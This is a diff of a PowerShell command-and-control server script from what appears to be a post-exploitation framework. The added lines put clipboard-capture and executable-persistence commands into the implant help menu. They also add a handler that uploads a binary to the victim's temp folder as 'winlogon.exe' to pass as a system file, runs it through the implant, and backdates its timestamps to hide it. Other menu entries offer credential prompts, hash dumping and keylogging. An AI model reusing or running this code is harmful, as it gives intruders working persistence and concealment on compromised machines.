@@ -502,6 +502,8 @@ $header = '
         write-host "================" -ForegroundColor Red
         write-host " Install-Persistence 1,2,3 " -ForegroundColor Green 
         write-host " Remove-Persistence 1,2,3" -ForegroundColor Green 
+        write-host " InstallExe-Persistence" -ForegroundColor Green
+        write-host " RemoveExe-Persistence" -ForegroundColor Green
         write-host " Install-ServiceLevel-Persistence | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
         write-host " Install-ServiceLevel-PersistenceWithProxy | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
         write-host `n "Network Tasks / Lateral Movement: " -ForegroundColor Green
@@ -604,6 +606,7 @@ $header = '
         write-host " Get-ScreenshotMulti -Timedelay 120 -Quantity 30" -ForegroundColor Green
         write-host " Get-RecentFiles" -ForegroundColor Green
         write-host " Cred-Popper" -ForegroundColor Green 
+        write-host " Get-Clipboard" -ForegroundColor Green 
         write-host " Hashdump" -ForegroundColor Green 
         write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
         write-host " PortScan -IPaddress 10.0.0.1-50 -Ports `"1-65535`" -maxQueriesPS 10000" -ForegroundColor Green
@@ -957,7 +960,7 @@ function Upload-File
         $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
     } while ($bytesRead -eq $bufferSize);
 
-    "Upload-File -Destination '$Destination' -Base64 $base64"
+    "Upload-File -Destination `"$Destination`" -Base64 $base64"
     $reader.Dispose()
 }
 
@@ -1303,6 +1306,16 @@ param
                 $pscommand = $null
                 $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT FolderPath FROM C2Server" -As SingleValue
                 Write-Host $dbresult
+            }
+            if ($pscommand.ToLower().StartsWith('installexe-persistence'))
+            {                 
+                $cmd = $pscommand -replace "installexe-persistence ",""
+                $cmd = $cmd -replace "installexe-persistence",""
+                $output = upload-file -source $cmd -destination "`$env:temp\winlogon.exe"
+                RunImplantCommand $output $psrandomuri
+                $commandstring2 = "TimeStomp `$env:temp\winlogon.exe `"01/03/2008 12:12 pm`""
+                RunImplantCommand $commandstring2 $psrandomuri
+                $pscommand = "InstallExe-Persistence"
             }
             if ($pscommand -eq 'ListModules') 
             {
